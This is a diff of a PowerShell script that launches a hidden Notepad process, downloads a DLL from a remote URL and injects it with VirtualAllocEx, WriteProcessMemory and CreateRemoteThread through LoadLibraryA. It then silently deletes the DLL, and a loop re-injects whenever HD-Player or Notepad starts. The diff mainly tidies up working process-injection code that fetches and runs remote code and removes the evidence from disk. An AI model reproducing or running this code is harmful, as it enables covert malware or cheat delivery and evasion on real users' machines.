@@ -37,62 +37,85 @@ public class Win32 {
 "@
 
 function Inject-IntoNewNotepad {
-    Write-Host "[*] Launching new hidden Notepad for injection..."
-    $newProcess = Start-Process -FilePath "notepad.exe" -WindowStyle Hidden -PassThru
-    Start-Sleep -Milliseconds 500
-
-    Write-Host "[*] Downloading DLL..."
     try {
+        Write-Host "`n[*] Launching new hidden Notepad for injection..."
+        $newProcess = Start-Process -FilePath "notepad.exe" -WindowStyle Hidden -PassThru
+        Start-Sleep -Milliseconds 500
+
+        Write-Host "[*] Downloading DLL..."
         Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
-    } catch {
-        Write-Host "[-] DLL download failed: $($_.Exception.Message)"
-        return
-    }
 
-    $pid = $newProcess.Id
-    $hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $pid)
+        $targetPid = $newProcess.Id
+        $hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $targetPid)
 
-    if ($hProcess -ne [IntPtr]::Zero) {
+        if ($hProcess -eq [IntPtr]::Zero) {
+            Write-Host "[-] Failed to open process PID $targetPid"
+            return
+        }
+
         $dllBytes = [System.Text.Encoding]::ASCII.GetBytes($dllPath + [char]0)
         $allocMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $dllBytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)
 
-        if ($allocMem -ne [IntPtr]::Zero) {
-            $written = [IntPtr]::Zero
-            $wrote = [Win32]::WriteProcessMemory($hProcess, $allocMem, $dllBytes, $dllBytes.Length, [ref]$written)
-
-            if ($wrote) {
-                $hKernel32 = [Win32]::GetModuleHandle("kernel32.dll")
-                $loadLibraryAddr = [Win32]::GetProcAddress($hKernel32, "LoadLibraryA")
-
-                if ($loadLibraryAddr -ne [IntPtr]::Zero) {
-                    $threadId = [IntPtr]::Zero
-                    [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [ref]$threadId) | Out-Null
-                    Write-Host "[+] DLL injected successfully."
-                }
-            }
+        if ($allocMem -eq [IntPtr]::Zero) {
+            Write-Host "[-] Memory allocation failed"
+            return
         }
-    }
 
-    Start-Sleep -Seconds 2
-    try { Remove-Item $dllPath -Force -ErrorAction SilentlyContinue } catch {}
+        $written = [IntPtr]::Zero
+        $wrote = [Win32]::WriteProcessMemory($hProcess, $allocMem, $dllBytes, $dllBytes.Length, [ref]$written)
+
+        if (-not $wrote) {
+            Write-Host "[-] WriteProcessMemory failed"
+            return
+        }
+
+        $hKernel32 = [Win32]::GetModuleHandle("kernel32.dll")
+        $loadLibraryAddr = [Win32]::GetProcAddress($hKernel32, "LoadLibraryA")
+
+        if ($loadLibraryAddr -eq [IntPtr]::Zero) {
+            Write-Host "[-] Failed to get LoadLibraryA address"
+            return
+        }
+
+        $threadId = [IntPtr]::Zero
+        [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [ref]$threadId) | Out-Null
+        Write-Host "[+] DLL injected successfully into Notepad PID $targetPid"
+
+        # 🔥 Wait and silently delete DLL
+        Start-Sleep -Seconds 2
+        Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
+        Write-Host "[*] DLL deleted from disk."
+    } catch {
+        Write-Host "[-] Injection failed: $($_.Exception.Message)"
+    }
 }
 
-# === Continuous Monitoring ===
+# === Continuous Monitoring Loop ===
+Write-Host "`n[*] Monitoring started... (Press Ctrl+C to stop)"
 while ($true) {
-    $isHdPlayerRunning = Get-Process -Name "HD-Player" -ErrorAction SilentlyContinue
-    $isNotepadRunning = Get-Process -Name "notepad" -ErrorAction SilentlyContinue
+    try {
+        $isHdPlayerRunning = Get-Process -Name "HD-Player" -ErrorAction SilentlyContinue
+        $isNotepadRunning = Get-Process -Name "notepad" -ErrorAction SilentlyContinue
 
-    $hdJustStarted = ($isHdPlayerRunning -ne $null) -and (-not $wasHdPlayerRunning)
-    $notepadJustStarted = ($isNotepadRunning -ne $null) -and (-not $wasNotepadRunning)
+        $hdJustStarted = ($isHdPlayerRunning -ne $null) -and (-not $wasHdPlayerRunning)
+        $notepadJustStarted = ($isNotepadRunning -ne $null) -and (-not $wasNotepadRunning)
 
-    if ($hdJustStarted -or $notepadJustStarted) {
-        Write-Host "[+] Detected new start of: " + ($(if ($hdJustStarted) { "HD-Player" } else { "Notepad" }))
-        Inject-IntoNewNotepad
+        if ($hdJustStarted) {
+            Write-Host "[+] HD-Player started — injecting..."
+            Inject-IntoNewNotepad
+        }
+
+        if ($notepadJustStarted) {
+            Write-Host "[+] Notepad started — injecting..."
+            Inject-IntoNewNotepad
+        }
+
+        $wasHdPlayerRunning = $isHdPlayerRunning -ne $null
+        $wasNotepadRunning = $isNotepadRunning -ne $null
+
+    } catch {
+        Write-Host "[-] Error during monitoring: $($_.Exception.Message)"
     }
-
-    # Save current state for next loop
-    $wasHdPlayerRunning = $isHdPlayerRunning -ne $null
-    $wasNotepadRunning = $isNotepadRunning -ne $null
 
     Start-Sleep -Seconds 2
 }
